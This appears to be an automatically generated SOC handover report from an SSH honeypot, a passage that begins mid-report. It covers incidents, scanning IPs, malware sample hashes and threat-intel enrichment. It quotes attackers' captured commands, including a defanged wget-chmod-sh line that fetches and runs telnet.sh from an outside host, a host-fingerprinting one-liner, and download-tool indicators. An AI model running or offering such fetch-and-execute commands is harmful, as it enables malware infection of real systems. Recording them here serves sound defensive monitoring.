**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0721b63e88e0

| Field | Detail |
|---|---|
| **Source IP** | `180.248.62[.]53` |
| **First Seen** | 2026-08-23 20:52 |
| **Last Seen** | 2026-08-23 20:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:52:31` | `cowrie.session.connect` |
| `2026-08-23 20:52:31` | `cowrie.client.version` |
| `2026-08-23 20:52:32` | `cowrie.client.kex` |
| `2026-08-23 20:52:36` | `cowrie.login.success` |
| `2026-08-23 20:52:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.248.62[.]53` to AbuseIPDB if not already reported
- [ ] Block `180.248.62[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc2579bf7d4b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:53 |
| **Last Seen** | 2026-08-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:53:42` | `cowrie.session.connect` |
| `2026-08-23 20:53:42` | `cowrie.client.version` |
| `2026-08-23 20:53:42` | `cowrie.client.kex` |
| `2026-08-23 20:53:43` | `cowrie.login.success` |
| `2026-08-23 20:53:44` | `cowrie.session.params` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.success` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.command.input` |
| `2026-08-23 20:53:44` | `cowrie.log.closed` |
| `2026-08-23 20:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5901510ed37

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]183` |
| **First Seen** | 2026-08-23 20:54 |
| **Last Seen** | 2026-08-23 20:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m, wget hxxp://176.65.139[.]202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh` |
| **Download Attempts** | hxxp://176.65.139[.]202:80/telnet.sh, hxxp://176.65.139[.]202/daredevil.armv7l, hxxp://176.65.139[.]202/daredevil.armv7l |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:54:35` | `cowrie.session.connect` |
| `2026-08-23 20:54:35` | `cowrie.login.success` |
| `2026-08-23 20:54:36` | `cowrie.session.params` |
| `2026-08-23 20:54:36` | `cowrie.command.input` |
| `2026-08-23 20:54:36` | `cowrie.command.input` |
| `2026-08-23 20:54:36` | `cowrie.session.file_download` |
| `2026-08-23 20:54:37` | `cowrie.session.file_download` |
| `2026-08-23 20:54:37` | `cowrie.session.file_download.failed` |
| `2026-08-23 20:54:37` | `cowrie.session.file_download` |
| `2026-08-23 20:54:37` | `cowrie.session.file_download` |
| `2026-08-23 20:54:37` | `cowrie.session.file_download` |
| `2026-08-23 20:54:38` | `cowrie.session.file_download` |
| `2026-08-23 20:54:38` | `cowrie.session.file_download` |
| `2026-08-23 20:54:38` | `cowrie.session.file_download` |
| `2026-08-23 20:54:39` | `cowrie.session.file_download` |
| `2026-08-23 20:54:39` | `cowrie.session.file_download` |
| `2026-08-23 20:54:40` | `cowrie.log.closed` |
| `2026-08-23 20:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]183` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.209.229[.]23` | **59** | 2026-08-23 18:55 | 2026-08-23 20:54 | 64m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.128[.]149` | **16** | 2026-08-23 18:55 | 2026-08-23 20:19 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-23 19:02 | 2026-08-23 20:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]118` | **3** | 2026-08-23 19:51 | 2026-08-23 19:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.230.93[.]18` | **3** | 2026-08-23 19:52 | 2026-08-23 19:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.145.237[.]236` | **2** | 2026-08-23 19:25 | 2026-08-23 19:27 | 4m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-08-23 20:28 | 2026-08-23 20:44 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `136.116.129[.]132` | 1 | 2026-08-23 18:57 | 2026-08-23 18:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-08-23 20:49 | 2026-08-23 20:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]134` | 1 | 2026-08-23 19:20 | 2026-08-23 19:20 | 2s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | 1 | 2026-08-23 19:39 | 2026-08-23 19:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.8.158[.]55` | 1 | 2026-08-23 20:11 | 2026-08-23 20:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `216.244.218[.]21` | 1 | 2026-08-23 18:56 | 2026-08-23 18:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.76.20[.]19` | 1 | 2026-08-23 19:37 | 2026-08-23 19:38 | 26s | 0 | `T1592` | 🟢 LOW |
| `38.76.139[.]54` | 1 | 2026-08-23 19:23 | 2026-08-23 19:23 | 11s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-08-23 20:45 | 2026-08-23 20:45 | 19s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-08-23 19:51 | 2026-08-23 19:51 | 4s | 0 | `T1592` | 🟢 LOW |
| `78.154.179[.]169` | 1 | 2026-08-23 20:13 | 2026-08-23 20:13 | 12s | 0 | `T1592` | 🟢 LOW |
| `78.39.109[.]160` | 1 | 2026-08-23 19:10 | 2026-08-23 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.66.83[.]43` | 1 | 2026-08-23 20:12 | 2026-08-23 20:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.179[.]185` | 1 | 2026-08-23 20:52 | 2026-08-23 20:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.255.210[.]166` | 1 | 2026-08-23 19:16 | 2026-08-23 19:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]22` | 1 | 2026-08-23 20:53 | 2026-08-23 20:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-08-23 19:05 | 2026-08-23 19:05 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.13.3[.]207` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 6 |
| `83.191.179[.]185` | SE | SE TELE2 BROADBAND | **100** ⚠️ | 1 |
| `87.225.108[.]138` | RU | PJSC Rostelecom | **100** ⚠️ | 50 |
| `216.244.218[.]21` | AR | Sinectis S.A. | **100** ⚠️ | 1 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `92.204.128[.]149` | US | Host Europe GmbH | **100** ⚠️ | 30 |
| `62.97.214[.]11` | NO | Eviny Fiber AS / Com4 | **100** ⚠️ | 19 |
| `112.78.177[.]237` | ID | Biznet Metronet | **100** ⚠️ | 1 |
| `65.20.158[.]10` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `187.93.68[.]178` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 157 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 146 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 57 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 57 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 2 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 276 cases |
| Tool 34  | Credential Extractor        | ✅ 167 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (8.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 68 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 146 priority case(s) shown individually · 24 recon entry/entries in table (7 group(s) consolidating 90 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T22:26:36Z_
